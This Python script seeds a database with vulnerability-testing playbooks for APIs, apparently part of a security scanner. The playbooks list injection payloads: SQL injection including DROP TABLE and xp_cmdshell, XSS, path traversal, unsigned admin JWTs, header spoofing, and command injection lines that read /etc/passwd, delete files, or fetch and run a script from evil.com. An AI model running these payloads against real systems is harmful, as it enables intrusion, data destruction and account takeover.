#!/usr/bin/env python3
"""
Script to initialize default playbooks in the database
"""

import asyncio
import sys
import os
from typing import Dict, Any

# Add the storage module to the path
sys.path.append(os.path.join(os.path.dirname(__file__), 'storage'))
from db import storage_db

def get_default_playbooks() -> Dict[str, Dict[str, Any]]:
    """Get default playbooks for common vulnerabilities"""
    return {
        "SQL Injection": {
            "description": "Test for SQL injection vulnerabilities in API parameters",
            "methodology": {
                "reconnaissance": [
                    "Identify input parameters that interact with databases",
                    "Check for common SQL keywords in parameter names",
                    "Analyze API responses for database error patterns"
                ],
                "testing_phases": [
                    {
                        "phase": "Basic SQL Injection",
                        "description": "Test basic SQL injection patterns",
                        "payloads": [
                            "' OR '1'='1",
                            "' OR '1'='1' --",
                            "1' OR '1'='1",
                            "' UNION SELECT NULL --",
                            "'; DROP TABLE users; --"
                        ],
                        "target_parameters": ["query", "search", "filter", "id", "username", "email"],
                        "http_methods": ["GET", "POST", "PUT"],
                        "success_indicators": ["SQL syntax error", "database error", "ORA-", "MySQL", "PostgreSQL"]
                    },
                    {
                        "phase": "Blind SQL Injection",
                        "description": "Test time-based and boolean-based blind SQL injection",
                        "payloads": [
                            "' AND SLEEP(5) --",
                            "' AND 1=1 --",
                            "' AND 1=2 --",
                            "1' AND SLEEP(5) --"
                        ],
                        "target_parameters": ["id", "user_id", "product_id"],
                        "http_methods": ["GET"],
                        "success_indicators": ["delayed response", "different response times"]
                    },
                    {
                        "phase": "Advanced SQL Injection",
                        "description": "Test advanced SQL injection techniques",
                        "payloads": [
                            "'; EXEC xp_cmdshell('net user') --",
                            "' UNION SELECT database() --",
                            "' UNION SELECT table_name FROM information_schema.tables --"
                        ],
                        "target_parameters": ["query", "search"],
                        "http_methods": ["GET", "POST"],
                        "success_indicators": ["command executed", "database name revealed", "table names"]
                    }
                ],
                "validation_rules": [
                    "Check for SQL error messages in responses",
                    "Monitor response times for time-based attacks",
                    "Verify data leakage in successful injections",
                    "Test parameter encoding and sanitization"
                ]
            },
            "severity": "high",
            "cvss_base_score": 8.5,
            "enabled": True
        },

        "XSS (Cross-Site Scripting)": {
            "description": "Test for Cross-Site Scripting vulnerabilities",
            "methodology": {
                "reconnaissance": [
                    "Identify parameters that reflect user input in responses",
                    "Check for HTML/JS contexts in API responses",
                    "Analyze Content-Type headers for HTML responses"
                ],
                "testing_phases": [
                    {
                        "phase": "Reflected XSS",
                        "description": "Test for reflected XSS in API responses",
                        "payloads": [
                            "<script>alert('xss')</script>",
                            "<img src=x onerror=alert('xss')>",
                            "javascript:alert('xss')",
                            "<svg onload=alert('xss')>",
                            "'><script>alert('xss')</script>"
                        ],
                        "target_parameters": ["query", "search", "name", "message", "comment"],
                        "http_methods": ["GET", "POST"],
                        "success_indicators": ["<script>", "alert(", "onerror", "onload"]
                    },
                    {
                        "phase": "Stored XSS",
                        "description": "Test for stored XSS in persistent data",
                        "payloads": [
                            "<script>alert('stored')</script>",
                            "<img src=x onerror=alert('stored')>",
                            "javascript:alert('stored')"
                        ],
                        "target_parameters": ["username", "bio", "description", "comment"],
                        "http_methods": ["POST", "PUT"],
                        "success_indicators": ["<script>", "alert(", "javascript:"]
                    },
                    {
                        "phase": "DOM XSS",
                        "description": "Test for DOM-based XSS vulnerabilities",
                        "payloads": [
                            "#<script>alert('dom')</script>",
                            "?param=<script>alert('dom')</script>",
                            "<iframe src=javascript:alert('dom')>"
                        ],
                        "target_parameters": ["#", "param"],
                        "http_methods": ["GET"],
                        "success_indicators": ["<script>", "javascript:", "<iframe"]
                    }
                ],
                "validation_rules": [
                    "Check if payloads appear unencoded in responses",
                    "Verify script execution in browser context",
                    "Test input sanitization and encoding",
                    "Monitor for reflected user input"
                ]
            },
            "severity": "high",
            "cvss_base_score": 7.5,
            "enabled": True
        },

        "IDOR (Insecure Direct Object References)": {
            "description": "Test for Insecure Direct Object Reference vulnerabilities",
            "methodology": {
                "reconnaissance": [
                    "Identify parameters that reference objects/resources",
                    "Check for sequential IDs in URLs and parameters",
                    "Analyze access control patterns in API"
                ],
                "testing_phases": [
                    {
                        "phase": "Basic IDOR",
                        "description": "Test basic ID manipulation",
                        "payloads": [
                            "1", "2", "3", "999", "0", "-1"
                        ],
                        "target_parameters": ["id", "user_id", "account_id", "order_id", "product_id"],
                        "http_methods": ["GET", "PUT", "DELETE"],
                        "success_indicators": ["access granted", "data returned", "successful modification"]
                    },
                    {
                        "phase": "Horizontal Privilege Escalation",
                        "description": "Test access to other users' resources",
                        "payloads": [
                            "2", "3", "100", "9999"
                        ],
                        "target_parameters": ["user_id", "account_id", "profile_id"],
                        "http_methods": ["GET", "PUT"],
                        "success_indicators": ["other user's data", "unauthorized access", "successful operation"]
                    },
                    {
                        "phase": "Vertical Privilege Escalation",
                        "description": "Test access to admin resources",
                        "payloads": [
                            "admin", "root", "superuser", "1"
                        ],
                        "target_parameters": ["role", "user_type", "permissions"],
                        "http_methods": ["GET", "POST"],
                        "success_indicators": ["admin access", "elevated privileges", "restricted data"]
                    }
                ],
                "validation_rules": [
                    "Verify if unauthorized access is possible",
                    "Check for proper access control enforcement",
                    "Test with different user contexts",
                    "Monitor for information disclosure"
                ]
            },
            "severity": "medium",
            "cvss_base_score": 6.5,
            "enabled": True
        },

        "Access Control Bypass": {
            "description": "Test for access control bypass vulnerabilities",
            "methodology": {
                "reconnaissance": [
                    "Map application roles and permissions",
                    "Identify protected resources and endpoints",
                    "Analyze authentication and authorization mechanisms"
                ],
                "testing_phases": [
                    {
                        "phase": "Authentication Bypass",
                        "description": "Test authentication mechanism bypass",
                        "payloads": [
                            "admin' --",
                            "' OR '1'='1",
                            "admin';--",
                            "null",
                            "{}"
                        ],
                        "target_parameters": ["username", "password", "token", "auth"],
                        "http_methods": ["POST"],
                        "success_indicators": ["login successful", "access granted", "authenticated"]
                    },
                    {
                        "phase": "Authorization Bypass",
                        "description": "Test authorization mechanism bypass",
                        "payloads": [
                            "../admin",
                            "..\\admin",
                            "%2e%2e/admin",
                            "%2e%2e%5cadmin"
                        ],
                        "target_parameters": ["path", "file", "resource"],
                        "http_methods": ["GET", "POST"],
                        "success_indicators": ["admin panel", "restricted access", "elevated privileges"]
                    },
                    {
                        "phase": "JWT Manipulation",
                        "description": "Test JWT token manipulation",
                        "payloads": [
                            "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxIiwiaXNzIjoiYXBwIiwiaWF0IjoxNjA5ODk5NjAwLCJleHAiOjE2MDk5MDAwMDAsInJvbGUiOiJhZG1pbiJ9.",
                            "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.",
                            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0."
                        ],
                        "target_parameters": ["token", "jwt", "authorization"],
                        "http_methods": ["GET", "POST"],
                        "success_indicators": ["invalid signature accepted", "algorithm confusion", "token accepted"]
                    }
                ],
                "validation_rules": [
                    "Verify proper authentication enforcement",
                    "Check authorization for all user roles",
                    "Test token validation and signing",
                    "Monitor for privilege escalation"
                ]
            },
            "severity": "critical",
            "cvss_base_score": 9.1,
            "enabled": True
        },

        "Command Injection": {
            "description": "Test for command injection vulnerabilities",
            "methodology": {
                "reconnaissance": [
                    "Identify parameters passed to system commands",
                    "Check for shell metacharacters in parameter names",
                    "Analyze error messages for command execution traces"
                ],
                "testing_phases": [
                    {
                        "phase": "Basic Command Injection",
                        "description": "Test basic command injection patterns",
                        "payloads": [
                            "; ls -la",
                            "| ls -la",
                            "`ls -la`",
                            "$(ls -la)",
                            "; cat /etc/passwd"
                        ],
                        "target_parameters": ["cmd", "command", "exec", "run", "shell"],
                        "http_methods": ["GET", "POST"],
                        "success_indicators": ["command output", "file listing", "directory contents", "passwd file"]
                    },
                    {
                        "phase": "Blind Command Injection",
                        "description": "Test blind command injection techniques",
                        "payloads": [
                            "; sleep 5",
                            "| sleep 5",
                            "`sleep 5`",
                            "$(sleep 5)"
                        ],
                        "target_parameters": ["cmd", "command", "exec"],
                        "http_methods": ["GET", "POST"],
                        "success_indicators": ["delayed response", "command executed"]
                    },
                    {
                        "phase": "Advanced Command Injection",
                        "description": "Test advanced command injection with chaining",
                        "payloads": [
                            "; cat /etc/passwd | head -5",
                            "| curl http://evil.com/shell.sh | bash",
                            "`wget http://evil.com -O /tmp/evil`",
                            "$(rm -rf /tmp/*)"
                        ],
                        "target_parameters": ["cmd", "command"],
                        "http_methods": ["POST"],
                        "success_indicators": ["command chaining", "file operations", "network connections"]
                    }
                ],
                "validation_rules": [
                    "Check for command execution in responses",
                    "Monitor response times for blind injection",
                    "Verify input sanitization and escaping",
                    "Test for dangerous command execution"
                ]
            },
            "severity": "critical",
            "cvss_base_score": 9.3,
            "enabled": True
        },

        "Rate Limiting Bypass": {
            "description": "Test for rate limiting bypass vulnerabilities",
            "methodology": {
                "reconnaissance": [
                    "Identify rate-limited endpoints",
                    "Check rate limit headers and responses",
                    "Analyze timing patterns for rate limiting"
                ],
                "testing_phases": [
                    {
                        "phase": "Header Manipulation",
                        "description": "Test rate limiting bypass via headers",
                        "payloads": [
                            "X-Forwarded-For: 192.168.1.1",
                            "X-Real-IP: 10.0.0.1",
                            "CF-Connecting-IP: 172.16.0.1",
                            "X-Client-IP: 203.0.113.1"
                        ],
                        "target_parameters": ["headers"],
                        "http_methods": ["GET", "POST"],
                        "success_indicators": ["rate limit bypassed", "request accepted", "no throttling"]
                    },
                    {
                        "phase": "Parameter Pollution",
                        "description": "Test rate limiting bypass via parameter pollution",
                        "payloads": [
                            "?api_key=valid&api_key=evil",
                            "?token=valid&token=evil",
                            "?user_id=1&user_id=2"
                        ],
                        "target_parameters": ["query_params"],
                        "http_methods": ["GET"],
                        "success_indicators": ["multiple parameters accepted", "rate limit evaded"]
                    },
                    {
                        "phase": "Timing Attacks",
                        "description": "Test rate limiting via timing manipulation",
                        "payloads": [
                            "slowloris technique",
                            "distributed requests",
                            "session rotation"
                        ],
                        "target_parameters": ["timing"],
                        "http_methods": ["GET", "POST"],
                        "success_indicators": ["rate limit window reset", "throttling bypassed"]
                    }
                ],
                "validation_rules": [
                    "Check rate limit enforcement",
                    "Test header-based bypass techniques",
                    "Verify distributed rate limiting"
                ]
            },
            "severity": "medium",
            "cvss_base_score": 5.5,
            "enabled": True
        }
    }

async def init_playbooks():
    """Initialize default playbooks in database"""
    print("🔄 Initializing playbooks in database...")

    try:
        # Check if playbooks already exist
        existing_playbooks = await storage_db.get_all_playbooks()
        if existing_playbooks:
            print(f"✅ {len(existing_playbooks)} playbooks already exist in database")
            return

        # Get default playbooks
        default_playbooks = get_default_playbooks()

        # Store each playbook
        stored_count = 0
        for vuln_type, playbook in default_playbooks.items():
            success = await storage_db.store_playbook(vuln_type, playbook)
            if success:
                stored_count += 1
                print(f"✅ Stored playbook: {vuln_type}")
            else:
                print(f"❌ Failed to store playbook: {vuln_type}")

        print(f"🎉 Successfully initialized {stored_count} playbooks in database")

    except Exception as e:
        print(f"❌ Error initializing playbooks: {e}")
        return False

    return True

if __name__ == "__main__":
    asyncio.run(init_playbooks())